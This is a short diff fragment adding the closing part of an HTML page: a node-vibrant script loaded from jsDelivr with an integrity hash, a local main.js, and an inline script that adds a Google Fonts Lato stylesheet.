+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
